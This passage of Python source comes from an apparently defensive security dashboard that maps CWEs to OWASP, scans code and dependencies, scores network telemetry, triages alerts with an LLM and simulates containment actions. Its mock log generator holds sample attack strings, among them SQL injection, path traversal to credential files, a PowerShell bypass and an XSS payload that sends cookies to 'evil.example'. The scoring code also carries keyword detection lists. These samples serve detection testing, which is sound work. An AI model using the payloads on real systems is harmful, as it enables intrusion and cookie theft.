        "description": "A default/well-known admin credential pair appears in code or configuration.",
        "remediation": "Force a mandatory credential change on first boot and disallow known-weak defaults entirely."
    },
]

# ------------------------------------------------------------------------
# OWASP Top 10 (2021) mapping — used for compliance-style rollups
# ------------------------------------------------------------------------
OWASP_TOP_10_MAP: Dict[str, str] = {
    "CWE-89": "A03:2021 - Injection", "CWE-90": "A03:2021 - Injection",
    "CWE-943": "A03:2021 - Injection", "CWE-98": "A03:2021 - Injection",
    "CWE-95": "A03:2021 - Injection", "CWE-78": "A03:2021 - Injection",
    "CWE-1336": "A03:2021 - Injection",
    "CWE-79": "A03:2021 - Injection",
    "CWE-798": "A07:2021 - Identification and Authentication Failures",
    "CWE-522": "A07:2021 - Identification and Authentication Failures",
    "CWE-613": "A07:2021 - Identification and Authentication Failures",
    "CWE-307": "A07:2021 - Identification and Authentication Failures",
    "CWE-326": "A02:2021 - Cryptographic Failures",
    "CWE-327": "A02:2021 - Cryptographic Failures",
    "CWE-330": "A02:2021 - Cryptographic Failures",
    "CWE-319": "A02:2021 - Cryptographic Failures",
    "CWE-295": "A02:2021 - Cryptographic Failures",
    "CWE-502": "A08:2021 - Software and Data Integrity Failures",
    "CWE-829": "A08:2021 - Software and Data Integrity Failures",
    "CWE-611": "A05:2021 - Security Misconfiguration",
    "CWE-489": "A05:2021 - Security Misconfiguration",
    "CWE-942": "A05:2021 - Security Misconfiguration",
    "CWE-1004": "A05:2021 - Security Misconfiguration",
    "CWE-548": "A05:2021 - Security Misconfiguration",
    "CWE-1021": "A05:2021 - Security Misconfiguration",
    "CWE-352": "A01:2021 - Broken Access Control",
    "CWE-284": "A01:2021 - Broken Access Control",
    "CWE-668": "A01:2021 - Broken Access Control",
    "CWE-250": "A01:2021 - Broken Access Control",
    "CWE-22": "A01:2021 - Broken Access Control",
    "CWE-601": "A01:2021 - Broken Access Control",
    "CWE-918": "A10:2021 - Server-Side Request Forgery",
    "CWE-200": "A01:2021 - Broken Access Control",
    "CWE-732": "A01:2021 - Broken Access Control",
    "CWE-434": "A08:2021 - Software and Data Integrity Failures",
    "CWE-1321": "A08:2021 - Software and Data Integrity Failures",
    "CWE-120": "A06:2021 - Vulnerable and Outdated Components",
    "CWE-242": "A06:2021 - Vulnerable and Outdated Components",
    "CWE-134": "A03:2021 - Injection",
    "CWE-367": "A04:2021 - Insecure Design",
    "CWE-390": "A09:2021 - Security Logging and Monitoring Failures",
    "CWE-521": "A07:2021 - Identification and Authentication Failures",
    "CWE-377": "A04:2021 - Insecure Design",
    "CWE-770": "A04:2021 - Insecure Design",
    "CWE-1333": "A04:2021 - Insecure Design",
    "CWE-400": "A04:2021 - Insecure Design",
    "CWE-430": "A05:2021 - Security Misconfiguration",
}


class ComplianceMapper:
    """Maps raw CWE findings onto higher-level compliance/reference frameworks."""

    def __init__(self, mapping: Optional[Dict[str, str]] = None):
        self.mapping = mapping or OWASP_TOP_10_MAP

    def map_finding(self, cwe: str) -> str:
        return self.mapping.get(cwe, "Unmapped / Other")

    def coverage_summary(self, findings: List["VulnerabilityFinding"]) -> Dict[str, int]:
        summary: Dict[str, int] = {}
        for f in findings:
            category = self.map_finding(f.cwe)
            summary[category] = summary.get(category, 0) + 1
        return dict(sorted(summary.items(), key=lambda kv: kv[1], reverse=True))


# ==============================================================================
# SECTION 2B: ASSET INVENTORY
# ==============================================================================

class Asset(BaseModel):
    asset_id: str
    name: str
    asset_type: str  # e.g. "Web Service", "Database", "K8s Workload", "API Gateway"
    criticality: str  # Critical / High / Medium / Low
    owner: str
    environment: str  # Production / Staging / Development
    exposure: str  # Internet-facing / Internal-only
    last_scanned: Optional[str] = None


class AssetInventory:
    """Lightweight in-memory CMDB used to give findings organizational context."""

    def __init__(self):
        self._assets: Dict[str, Asset] = {}

    def register(self, asset: Asset) -> None:
        self._assets[asset.asset_id] = asset

    def bulk_seed(self, assets: List[Asset]) -> None:
        for a in assets:
            self.register(a)

    def touch_scanned(self, asset_id: str) -> None:
        if asset_id in self._assets:
            self._assets[asset_id].last_scanned = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def all_assets(self) -> List[Asset]:
        return list(self._assets.values())

    def by_criticality(self, level: str) -> List[Asset]:
        return [a for a in self._assets.values() if a.criticality == level]

    def exposure_summary(self) -> Dict[str, int]:
        summary: Dict[str, int] = {}
        for a in self._assets.values():
            summary[a.exposure] = summary.get(a.exposure, 0) + 1
        return summary


DEFAULT_ASSET_SEED: List[Dict[str, str]] = [
    {"asset_id": "AST-001", "name": "prod-auth-v2", "asset_type": "Auth Service",
     "criticality": "Critical", "owner": "Platform Security", "environment": "Production", "exposure": "Internet-facing"},
    {"asset_id": "AST-002", "name": "db-cluster-primary", "asset_type": "Database",
     "criticality": "Critical", "owner": "Data Platform", "environment": "Production", "exposure": "Internal-only"},
    {"asset_id": "AST-003", "name": "k8s-ingress-gateway", "asset_type": "API Gateway",
     "criticality": "High", "owner": "Platform Infra", "environment": "Production", "exposure": "Internet-facing"},
    {"asset_id": "AST-004", "name": "billing-api", "asset_type": "Web Service",
     "criticality": "High", "owner": "Payments Team", "environment": "Production", "exposure": "Internet-facing"},
    {"asset_id": "AST-005", "name": "user-service", "asset_type": "Web Service",
     "criticality": "Medium", "owner": "Growth Team", "environment": "Staging", "exposure": "Internal-only"},
]


# ==============================================================================
# SECTION 2C: EXECUTIVE SUMMARY GENERATOR
# ==============================================================================

class ExecutiveSummaryGenerator:
    """Produces a plain-English, non-technical rollup suitable for leadership."""

    @staticmethod
    def summarize(findings: List["VulnerabilityFinding"], dep_findings: List["DependencyVuln"],
                  events: List["LogEvent"], containment_actions: List[Dict[str, Any]]) -> str:
        critical = len([f for f in findings if f.severity == "Critical"])
        high = len([f for f in findings if f.severity == "High"])
        crit_deps = len([d for d in dep_findings if d.severity == "Critical"])
        crit_events = len([e for e in events if e.anomaly_score >= 70])

        lines = [
            f"Sentinel AI reviewed {len(findings)} code-level findings, {len(dep_findings)} dependency "
            f"advisories, and {len(events)} network telemetry events as of "
            f"{datetime.now().strftime('%Y-%m-%d %H:%M')}.",
            "",
            f"- {critical} Critical and {high} High severity code issues require prioritized remediation.",
            f"- {crit_deps} dependency package(s) carry a Critical-severity known CVE and should be patched first.",
            f"- {crit_events} network event(s) scored above the high-risk anomaly threshold in this session.",
            f"- {len(containment_actions)} automated/simulated containment action(s) have been executed to date.",
            "",
            "Recommended next steps:",
            "1. Patch or mitigate all Critical findings within 24-48 hours; track High findings on the current sprint.",
            "2. Rotate any credentials or keys implicated by hardcoded-secret findings immediately.",
            "3. Confirm dependency upgrades in a staging environment before promoting to production.",
            "4. Review network anomalies for false positives, then tune detection thresholds accordingly.",
        ]
        return "\n".join(lines)


class CodeVulnerabilityScanner:
    """Regex/pattern based static analysis engine for common vulnerability classes."""

    def __init__(self, rules: Optional[List[Dict[str, Any]]] = None):
        self.rules = rules or VULNERABILITY_RULES
        self._compiled = [
            (rule, re.compile(rule["pattern"], re.MULTILINE)) for rule in self.rules
        ]

    def scan_text(self, file_name: str, content: str) -> List[VulnerabilityFinding]:
        findings: List[VulnerabilityFinding] = []
        lines = content.splitlines()
        for rule, pattern in self._compiled:
            for match in pattern.finditer(content):
                line_no = content[: match.start()].count("\n") + 1
                snippet = lines[line_no - 1].strip() if 0 < line_no <= len(lines) else match.group(0)
                snippet = snippet[:160]
                findings.append(
                    VulnerabilityFinding(
                        finding_id=f"{file_name}:{line_no}:{rule['id']}",
                        rule_id=rule["id"],
                        title=rule["title"],
                        severity=rule["severity"],
                        cwe=rule["cwe"],
                        cvss_estimate=rule["cvss"],
                        file_name=file_name,
                        line_number=line_no,
                        matched_snippet=snippet,
                        description=rule["description"],
                        remediation=rule["remediation"],
                        confidence="Medium",
                    )
                )
        return findings

    def scan_files(self, files: Dict[str, str]) -> List[VulnerabilityFinding]:
        all_findings: List[VulnerabilityFinding] = []
        for name, content in files.items():
            all_findings.extend(self.scan_text(name, content))
        return all_findings

    @staticmethod
    def severity_weight(severity: str) -> int:
        return {"Critical": 4, "High": 3, "Medium": 2, "Low": 1, "Info": 0}.get(severity, 0)

    def risk_score(self, findings: List[VulnerabilityFinding]) -> float:
        if not findings:
            return 0.0
        total = sum(self.severity_weight(f.severity) * f.cvss_estimate for f in findings)
        return round(min(total / max(len(findings), 1) * 10, 100.0), 1)


# ==============================================================================
# SECTION 3: DEPENDENCY / SUPPLY-CHAIN CVE DATABASE (MOCK, EXTENSIBLE)
# ==============================================================================

MOCK_CVE_DATABASE: List[Dict[str, str]] = [
    {"package": "flask", "vulnerable_range": "<2.2.5", "cve_id": "CVE-2023-30861", "severity": "High",
     "summary": "Cookie session disclosure via crafted set of requests.", "fixed_version": "2.2.5"},
    {"package": "django", "vulnerable_range": "<4.2.1", "cve_id": "CVE-2023-31047", "severity": "Medium",
     "summary": "Potential denial-of-service via crafted file upload names.", "fixed_version": "4.2.1"},
    {"package": "requests", "vulnerable_range": "<2.31.0", "cve_id": "CVE-2023-32681", "severity": "Medium",
     "summary": "Unintended leak of Proxy-Authorization header on cross-origin redirect.", "fixed_version": "2.31.0"},
    {"package": "pyyaml", "vulnerable_range": "<5.4", "cve_id": "CVE-2020-14343", "severity": "Critical",
     "summary": "Arbitrary code execution via yaml.full_load / unsafe Loader.", "fixed_version": "5.4"},
    {"package": "pillow", "vulnerable_range": "<10.0.1", "cve_id": "CVE-2023-44271", "severity": "High",
     "summary": "Denial of service through crafted image files.", "fixed_version": "10.0.1"},
    {"package": "urllib3", "vulnerable_range": "<1.26.18", "cve_id": "CVE-2023-45803", "severity": "Medium",
     "summary": "Cookie header not stripped on cross-origin redirect.", "fixed_version": "1.26.18"},
    {"package": "lodash", "vulnerable_range": "<4.17.21", "cve_id": "CVE-2021-23337", "severity": "High",
     "summary": "Command injection via template function.", "fixed_version": "4.17.21"},
    {"package": "log4j-core", "vulnerable_range": "<=2.14.1", "cve_id": "CVE-2021-44228", "severity": "Critical",
     "summary": "Log4Shell — remote code execution via JNDI lookup in log messages.", "fixed_version": "2.17.1"},
    {"package": "openssl", "vulnerable_range": "1.1.1<1.1.1n", "cve_id": "CVE-2022-0778", "severity": "High",
     "summary": "Infinite loop in BN_mod_sqrt() reachable via crafted certificate.", "fixed_version": "1.1.1n"},
    {"package": "jinja2", "vulnerable_range": "<3.1.3", "cve_id": "CVE-2024-22195", "severity": "Medium",
     "summary": "HTML attribute injection via the xmlattr filter.", "fixed_version": "3.1.3"},
    {"package": "spring-core", "vulnerable_range": "<5.3.18", "cve_id": "CVE-2022-22965", "severity": "Critical",
     "summary": "Spring4Shell — RCE via data binding on JDK 9+.", "fixed_version": "5.3.18"},
    {"package": "express", "vulnerable_range": "<4.17.3", "cve_id": "CVE-2022-24999", "severity": "Medium",
     "summary": "Denial of service via crafted query-string parser input.", "fixed_version": "4.17.3"},
    {"package": "axios", "vulnerable_range": "<1.6.0", "cve_id": "CVE-2023-45857", "severity": "Medium",
     "summary": "Cross-site request forgery via absolute URL following.", "fixed_version": "1.6.0"},
    {"package": "cryptography", "vulnerable_range": "<41.0.6", "cve_id": "CVE-2023-49083", "severity": "Medium",
     "summary": "NULL-pointer dereference when loading malformed PKCS7 data.", "fixed_version": "41.0.6"},
    {"package": "paramiko", "vulnerable_range": "<2.10.1", "cve_id": "CVE-2022-24302", "severity": "Medium",
     "summary": "Race condition in agent forwarding could leak sensitive data.", "fixed_version": "2.10.1"},
]


class DependencyScanner:
    """Compares a submitted package manifest against a local vulnerability feed."""

    def __init__(self, feed: Optional[List[Dict[str, str]]] = None):
        self.feed = feed or MOCK_CVE_DATABASE

    @staticmethod
    def _parse_manifest(text: str) -> Dict[str, str]:
        packages: Dict[str, str] = {}
        for raw_line in text.splitlines():
            line = raw_line.strip()
            if not line or line.startswith("#"):
                continue
            for sep in ["==", ">=", "<=", "~=", "@"]:
                if sep in line:
                    name, _, version = line.partition(sep)
                    packages[name.strip().lower()] = version.strip()
                    break
            else:
                packages[line.lower()] = "unknown"
        return packages

    def scan_manifest(self, text: str) -> List[DependencyVuln]:
        packages = self._parse_manifest(text)
        findings: List[DependencyVuln] = []
        for entry in self.feed:
            pkg = entry["package"].lower()
            if pkg in packages:
                findings.append(
                    DependencyVuln(
                        package=entry["package"],
                        installed_version=packages[pkg],
                        vulnerable_range=entry["vulnerable_range"],
                        cve_id=entry["cve_id"],
                        severity=entry["severity"],
                        summary=entry["summary"],
                        fixed_version=entry["fixed_version"],
                    )
                )
        return findings


# ==============================================================================
# SECTION 4: NETWORK TELEMETRY INGESTION & ANOMALY SCORING
# ==============================================================================

class IngestionEngine:
    def __init__(self, buffer_size: int = 500):
        self.buffer_size = buffer_size
        self._buffer: List[LogEvent] = []

    def score_event(self, event: LogEvent) -> LogEvent:
        score = 10.0
        payload = event.raw_payload.lower()

        if any(k in payload for k in ["select", "union", "drop", "--", "' or '1'='1"]):
            score += 45.0
            event.threat_category = "SQL Injection"
        if any(k in payload for k in ["/etc/passwd", "cmd.exe", "powershell", "wget ", "curl "]):
            score += 55.0
            event.threat_category = "Remote Code Execution"
        if any(k in payload for k in ["authorization: bearer", "jwt", "apikey", "x-api-key"]):
            score += 35.0
            event.threat_category = "Credential Exfiltration"
        if any(k in payload for k in ["<script", "onerror=", "javascript:"]):
            score += 40.0
            event.threat_category = "Cross-Site Scripting"
        if "../" in payload or "..%2f" in payload:
            score += 38.0
            event.threat_category = "Path Traversal"
        if len(payload) > 250:
            score += 15.0

        event.anomaly_score = min(score, 100.0)
        return event

    def ingest(self, event: LogEvent) -> None:
        processed = self.score_event(event)
        if len(self._buffer) >= self.buffer_size:
            self._buffer.pop(0)
        self._buffer.append(processed)

    def get_all_events(self) -> List[LogEvent]:
        return list(self._buffer)


def generate_mock_log() -> LogEvent:
    ips = ["10.0.4.12", "192.168.1.105", "172.16.0.4", "45.33.21.90", "185.220.101.5", "203.0.113.44"]
    assets = ["prod-auth-v2", "db-cluster-primary", "k8s-ingress-gateway", "billing-api", "user-service"]
    payloads = [
        "GET /api/v1/user?id=1' UNION SELECT username, password_hash FROM admin_users-- HTTP/1.1",
        "POST /auth/login HTTP/1.1 Host: auth.prod User-Agent: Mozilla/5.0",
        "GET /static/../../../../etc/passwd HTTP/1.1",
        "POST /api/v2/exec Payload: powershell.exe -ExecutionPolicy Bypass -Command 'Invoke-WebRequest'",
        "POST /oauth/token Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
        "GET /search?q=<script>document.location='http://evil.example/steal?c='+document.cookie</script>",
        "GET /files?path=../../../../windows/system32/config/sam",
    ]
    return LogEvent(
        event_id=f"evt_{int(time.time() * 1000)}_{random.randint(100, 999)}",
        timestamp=time.time(),
        source_ip=random.choice(ips),
        target_asset=random.choice(assets),
        protocol=random.choice(["HTTPS", "gRPC", "SSH", "TCP"]),
        raw_payload=random.choice(payloads),
    )


# ==============================================================================
# SECTION 5: THREAT INTELLIGENCE / IP REPUTATION ENGINE
# ==============================================================================

KNOWN_SUSPICIOUS_RANGES = ["185.220.", "45.33.", "89.248.", "194.26.", "91.240."]


class ThreatIntelEngine:
    """Heuristic IP reputation scoring — no external calls, fully offline-capable."""

    @staticmethod
    def _is_private(ip: str) -> bool:
        return ip.startswith(("10.", "192.168.")) or bool(re.match(r"^172\.(1[6-9]|2\d|3[01])\.", ip))

    def evaluate(self, ip: str) -> ThreatIntelResult:
        notes: List[str] = []
        score = 5

        if self._is_private(ip):
            notes.append("Address falls within RFC1918 private space — treat as internal asset.")
            return ThreatIntelResult(
                ip_address=ip, reputation_score=0, classification="Internal / Trusted",
                is_private=True, notes=notes,
            )

        if any(ip.startswith(prefix) for prefix in KNOWN_SUSPICIOUS_RANGES):
            score += 60
            notes.append("IP prefix matches a known suspicious/anonymization-associated range.")

        octets = ip.split(".")
        if len(octets) == 4 and octets[-1] in ("1", "254"):
            score += 5
            notes.append("Gateway-like host suffix observed.")

        score += random.randint(0, 15)  # simulated intel jitter for demo telemetry
        score = min(score, 100)

        if score >= 70:
            classification = "Malicious (High Confidence)"
        elif score >= 40:
            classification = "Suspicious"
        else:
            classification = "Likely Benign"

        return ThreatIntelResult(
            ip_address=ip, reputation_score=score, classification=classification,
            is_private=False, notes=notes or ["No adverse indicators found in local intel feed."],
        )


# ==============================================================================
# SECTION 6: LLM-POWERED DEEP TRIAGE ORCHESTRATOR
# ==============================================================================

class LLMTriageOrchestrator:
    def __init__(self, provider: str = "Offline / Local Rule Engine", api_key: Optional[str] = None,
                 model_name: Optional[str] = None, local_host: str = "http://localhost:11434"):
        self.provider = provider
        self.api_key = api_key
        self.local_host = local_host
        if model_name:
            self.model_name = model_name
        elif provider == "OpenAI":
            self.model_name = "gpt-4o"
        elif provider == "Anthropic":
            self.model_name = "claude-sonnet-4-5"
        else:
            self.model_name = "llama3"

    def _build_prompt(self, context_label: str, payload: str, score: float) -> str:
        return f"""
        SENTINEL AI TRIAGE REQUEST
        Context: {context_label}
        Risk Score: {score}/100
        Evidence: {payload}

        Perform a concise security triage. Respond with ONLY valid JSON matching:
        {{
            "threat_level": "Critical|High|Medium|Low",
            "attack_vector": "Brief classification",
            "impact_assessment": "Impact on systems / data",
            "actionable_remediation": ["Step 1", "Step 2", "Step 3"]
        }}
        """

    def execute_triage(self, context_label: str, payload: str, score: float) -> TriageReport:
        prompt = self._build_prompt(context_label, payload, score)

        if self.provider == "Ollama (Local)":
            try:
                response = requests.post(
                    f"{self.local_host}/api/generate",
                    json={"model": self.model_name, "prompt": prompt, "format": "json", "stream": False},
                    timeout=10,
                )
                if response.status_code == 200:
                    data = json.loads(response.json().get("response", "{}"))
                    return TriageReport(**data)
            except Exception:
                pass

        elif self.provider == "OpenAI" and self.api_key and OpenAI:
            try:
                client = OpenAI(api_key=self.api_key)
                response = client.chat.completions.create(
                    model=self.model_name,
                    messages=[
                        {"role": "system", "content": "You are Sentinel AI, a defensive incident-response triage engine. Return ONLY JSON."},
                        {"role": "user", "content": prompt},
                    ],
                    response_format={"type": "json_object"},
                )
                data = json.loads(response.choices[0].message.content)
                return TriageReport(**data)
            except Exception:
                pass

        elif self.provider == "Anthropic" and self.api_key and Anthropic:
            try:
                client = Anthropic(api_key=self.api_key)
                message = client.messages.create(
                    model=self.model_name,
                    max_tokens=500,
                    messages=[{"role": "user", "content": prompt}],
                )
                data = json.loads(message.content[0].text)
                return TriageReport(**data)
            except Exception:
                pass

        # Deterministic offline fallback so the app always returns a usable report
        level = "Critical" if score > 85 else "High" if score > 65 else "Medium" if score > 35 else "Low"
        return TriageReport(
            threat_level=level,
            attack_vector=f"Local Heuristic Match ({context_label})",
            impact_assessment="Potential unauthorized access, data exposure, or service disruption pending confirmation.",
            actionable_remediation=[
                "Isolate or rate-limit the source associated with this event.",
                "Review recent authentication and access logs for the affected asset.",
                "Escalate to on-call security engineer if score remains elevated after review.",
            ],
        )


# ==============================================================================
# SECTION 7: ACTIVE CONTAINMENT PLAYBOOKS (SIMULATED)
# ==============================================================================

class ActiveContainmentEngine:
    def __init__(self, webhook_url: Optional[str] = None):
        self.webhook_url = webhook_url
        self.action_history: List[Dict[str, Any]] = []

    def _record(self, action: Dict[str, Any]) -> Dict[str, Any]:
        self.action_history.append(action)
        if self.webhook_url:
            try:
                requests.post(self.webhook_url, json=action, timeout=3)
            except Exception:
                pass
        return action

    def block_ip_firewall(self, ip_address: str, duration_mins: int = 60) -> Dict[str, Any]:
        return self._record({
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "action": "BLOCK_IP", "target": ip_address, "status": "SUCCESS",
            "details": f"Added drop rule for {ip_address} (TTL: {duration_mins}m)",
        })

    def isolate_k8s_pod(self, target_asset: str) -> Dict[str, Any]:
        return self._record({
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "action": "ISOLATE_K8S_ASSET", "target": target_asset, "status": "SUCCESS",
            "details": f"Applied deny-all NetworkPolicy to workload deployment/{target_asset}",
        })

    def revoke_api_tokens(self, target_asset: str) -> Dict[str, Any]:
        return self._record({
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "action": "REVOKE_CREDENTIALS", "target": target_asset, "status": "SUCCESS",
            "details": f"Invalidated JWT service accounts and dynamic IAM keys for {target_asset}",
        })

    def quarantine_file(self, file_name: str) -> Dict[str, Any]:
        return self._record({
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "action": "QUARANTINE_FILE", "target": file_name, "status": "SUCCESS",
            "details": f"Moved {file_name} to isolated quarantine storage pending manual review.",
        })

    def force_password_reset(self, target_asset: str) -> Dict[str, Any]:
        return self._record({
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "action": "FORCE_PASSWORD_RESET", "target": target_asset, "status": "SUCCESS",
            "details": f"Triggered mandatory credential rotation for accounts on {target_asset}",
        })

    def get_action_history(self) -> List[Dict[str, Any]]:
        return self.action_history


# ==============================================================================
# SECTION 8: REPORT GENERATION
# ==============================================================================

class ReportGenerator:
    @staticmethod
    def findings_to_dataframe(findings: List[VulnerabilityFinding]) -> pd.DataFrame:
        if not findings:
            return pd.DataFrame(columns=[
                "rule_id", "title", "severity", "cwe", "cvss_estimate",
                "file_name", "line_number", "matched_snippet",
            ])
        return pd.DataFrame([f.model_dump() for f in findings])

    @staticmethod
    def build_json_report(scan_name: str, findings: List[VulnerabilityFinding],
                           dep_findings: List[DependencyVuln]) -> str:
        report = {
            "report_name": scan_name,
            "generated_at": datetime.now().isoformat(),
            "summary": {
                "total_code_findings": len(findings),
                "total_dependency_findings": len(dep_findings),
                "by_severity": {
                    sev: len([f for f in findings if f.severity == sev])
                    for sev in ["Critical", "High", "Medium", "Low", "Info"]
                },
            },
            "code_findings": [f.model_dump() for f in findings],
            "dependency_findings": [d.model_dump() for d in dep_findings],
        }
        return json.dumps(report, indent=2)


# ==============================================================================
# ==============================================================================
#  SEMANTIC TAINT ENGINE MODULE (embedded) — real AST-based interprocedural
#  vulnerability analysis for Python, wired into the dashboard below as a
#  dedicated "Semantic Scanner" tab, distinct from the regex-based
#  CodeVulnerabilityScanner used elsewhere in this file. See each class's
#  docstring for exact scope/limitations (this is disclosed, not hidden).
# ==============================================================================
# ==============================================================================

# ==============================================================================
# SECTION 1: ENUMS & STANDARDS MAPPING
# ==============================================================================

class Severity(str, Enum):
    CRITICAL = "Critical"
    HIGH = "High"
    MEDIUM = "Medium"
    LOW = "Low"
    INFO = "Info"


class Confidence(str, Enum):
    HIGH = "High"
    MEDIUM = "Medium"
    LOW = "Low"


@dataclass(frozen=True)
class StandardsMapping:
    cwe: str
    owasp_top10: str = ""
    owasp_asvs: str = ""
    capec: str = ""
    nist_ssdf: str = ""
    mitre_attack: str = ""  # left blank unless a genuine correspondence exists


# ==============================================================================
# SECTION 2: CORE DATA MODELS
# ==============================================================================

@dataclass
class PropagationStep:
    line: int
    code: str
    kind: str  # "function_entry" | "source" | "assignment" | "call" | "sink"
    function: str = ""


@dataclass
class Finding:
    finding_id: str
    rule_id: str
    title: str
    vuln_class: str
    severity: str
    confidence: str
    standards: StandardsMapping
    file_name: str
    function_name: str
    sink_line: int
    evidence: str
    propagation_path: List[PropagationStep]
    impacted_functions: List[str]
    remediation: str
    suggested_fix: str
    engine: str = "semantic"  # "semantic" (AST/taint) vs "heuristic" (regex fallback)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "finding_id": self.finding_id,
            "rule_id": self.rule_id,
            "title": self.title,
            "vuln_class": self.vuln_class,
            "severity": self.severity,
            "confidence": self.confidence,
            "cwe": self.standards.cwe,
            "owasp_top10": self.standards.owasp_top10,
            "owasp_asvs": self.standards.owasp_asvs,
            "capec": self.standards.capec,
            "nist_ssdf": self.standards.nist_ssdf,
            "mitre_attack": self.standards.mitre_attack,
            "file_name": self.file_name,
            "function_name": self.function_name,
            "sink_line": self.sink_line,
            "evidence": self.evidence,
            "propagation_path": [
                {"line": s.line, "code": s.code, "kind": s.kind, "function": s.function}
                for s in self.propagation_path
            ],
            "impacted_functions": self.impacted_functions,
            "remediation": self.remediation,
            "suggested_fix": self.suggested_fix,
            "engine": self.engine,
        }


@dataclass
class TaintRule:
    """A structured rule object — sources/sinks/sanitizers/severity/CWE/confidence/remediation."""
    id: str
    title: str
    vuln_class: str
    sinks: Set[str]                 # exact dotted names or "*.suffix" wildcards
    severity: Severity
    base_confidence: Confidence
    standards: StandardsMapping
    remediation: str
    min_safe_arity: Optional[int] = None  # e.g. SQL: >=2 args (query, params) => safe


@dataclass
class PatternRule:
    """Regex heuristic-tier rule for languages without a real parser frontend here."""
    id: str
    title: str
    pattern: str
    language: str
    severity: Severity
    standards: StandardsMapping
    confidence: Confidence
    remediation: str


ALL_VULN_CLASSES: Set[str] = {
    "sql_injection", "command_injection", "code_execution", "xss",
    "path_traversal", "ssrf", "insecure_deserialization",
    "template_injection", "ldap_injection", "xxe",
}


# ==============================================================================
# SECTION 3: STANDARDS MAPPING TABLE (CWE -> OWASP Top10 / ASVS / CAPEC / SSDF)
# ==============================================================================

def _std(cwe: str, top10: str, asvs: str, capec: str, ssdf: str, attack: str = "") -> StandardsMapping:
    return StandardsMapping(cwe=cwe, owasp_top10=top10, owasp_asvs=asvs, capec=capec,
                             nist_ssdf=ssdf, mitre_attack=attack)


STD_SQLI = _std("CWE-89", "A03:2021-Injection", "ASVS 5.3.4", "CAPEC-66",
                 "PW.5.1 (Review/analyze for security)", "T1190 (Exploit Public-Facing App)")
STD_CMDI = _std("CWE-78", "A03:2021-Injection", "ASVS 5.2.8", "CAPEC-88",
                 "PW.5.1", "T1059 (Command and Scripting Interpreter)")
STD_CODE_EXEC = _std("CWE-95", "A03:2021-Injection", "ASVS 5.2.4", "CAPEC-242", "PW.5.1")
STD_XSS = _std("CWE-79", "A03:2021-Injection", "ASVS 5.3.3", "CAPEC-63", "PW.5.1")
STD_PATH = _std("CWE-22", "A01:2021-Broken Access Control", "ASVS 12.3.1", "CAPEC-126", "PW.5.1")
STD_SSRF = _std("CWE-918", "A10:2021-SSRF", "ASVS 5.2.5", "CAPEC-664", "PW.5.1")
STD_DESER = _std("CWE-502", "A08:2021-Software and Data Integrity Failures", "ASVS 5.5.3",
                  "CAPEC-586", "PW.4.1")
STD_SSTI = _std("CWE-1336", "A03:2021-Injection", "ASVS 5.3.4", "CAPEC-242", "PW.5.1")
STD_LDAP = _std("CWE-90", "A03:2021-Injection", "ASVS 5.3.7", "CAPEC-136", "PW.5.1")
STD_XXE = _std("CWE-611", "A05:2021-Security Misconfiguration", "ASVS 5.5.2", "CAPEC-221", "PW.5.1")


# ==============================================================================
# SECTION 4: SOURCE / SANITIZER REGISTRIES
# ==============================================================================

# Generic taint sources: reaching any of these marks a value tainted for ALL
# vuln classes (a value from user input is dangerous for many sink types at once).
SOURCE_PATTERNS: Set[str] = {
    "request.args", "request.form", "request.GET", "request.POST", "request.json",
    "request.data", "request.cookies", "request.headers", "request.values",
    "input", "sys.argv", "os.environ.get", "*.get_json",
    "req.query", "req.body", "req.params",
}

# Heuristic: parameter names that suggest an entry point receives raw external
# input even without a literal source call in the body (documented heuristic).
TAINTED_PARAM_NAME_HINTS: Set[str] = {
    "request", "req", "user_input", "data", "payload", "query", "cmd",
    "filename", "path", "url", "raw_input", "untrusted",
}

# Route-decorator patterns that mark a function as a framework entry point.
ROUTE_DECORATOR_PATTERNS: Set[str] = {
    "*.route", "app.route", "*.get", "*.post", "*.put", "*.delete", "*.patch",
}

# Sanitizers that neutralize taint for a SPECIFIC vuln class only.
SANITIZERS: Dict[str, Set[str]] = {
    "xss": {"html.escape", "markupsafe.escape", "*.escape"},
    "command_injection": {"shlex.quote", "*.quote"},
    "path_traversal": {"werkzeug.utils.secure_filename", "*.secure_filename", "os.path.basename"},
    "ldap_injection": {"*.escape_filter_chars", "ldap.filter.escape_filter_chars"},
    "sql_injection": set(),              # handled structurally (parameterized-query check)
    "command_injection_struct": set(),   # handled structurally (shell=True / list-args check)
    "ssrf": set(),
    "insecure_deserialization": set(),   # no reliable auto-sanitizer; always flag
    "template_injection": set(),
    "code_execution": set(),
    "xxe": set(),
}


TAINT_RULES: List[TaintRule] = [
    TaintRule(id="TS-001", title="SQL Injection via unparameterized query execution",
              vuln_class="sql_injection", sinks={"*.execute", "*.executemany"},
              severity=Severity.CRITICAL, base_confidence=Confidence.HIGH,
              standards=STD_SQLI, min_safe_arity=2,
              remediation="Pass query parameters as a separate bound-parameter argument: "
                          "cursor.execute(\"...WHERE id = %s\", (user_id,))."),
    TaintRule(id="TS-002", title="Command Injection via os.system",
              vuln_class="command_injection", sinks={"os.system", "os.popen"},
              severity=Severity.CRITICAL, base_confidence=Confidence.HIGH,
              standards=STD_CMDI,
              remediation="Use subprocess.run([...]) with a list of arguments and shell=False."),
    TaintRule(id="TS-003", title="Command Injection via subprocess with shell=True",
              vuln_class="command_injection",
              sinks={"subprocess.run", "subprocess.call", "subprocess.Popen", "subprocess.check_output"},
              severity=Severity.CRITICAL, base_confidence=Confidence.HIGH,
              standards=STD_CMDI,
              remediation="Pass command arguments as a list and avoid shell=True; if unavoidable, "
                          "sanitize with shlex.quote()."),
    TaintRule(id="TS-004", title="Arbitrary Code Execution via eval()/exec()",
              vuln_class="code_execution", sinks={"eval", "exec"},
              severity=Severity.CRITICAL, base_confidence=Confidence.HIGH,
              standards=STD_CODE_EXEC,
              remediation="Replace eval/exec with ast.literal_eval() for data, or an explicit "
                          "dispatch table for logic."),
    TaintRule(id="TS-005", title="Insecure Deserialization via pickle",
              vuln_class="insecure_deserialization", sinks={"pickle.loads", "pickle.load"},
              severity=Severity.CRITICAL, base_confidence=Confidence.HIGH,
              standards=STD_DESER,
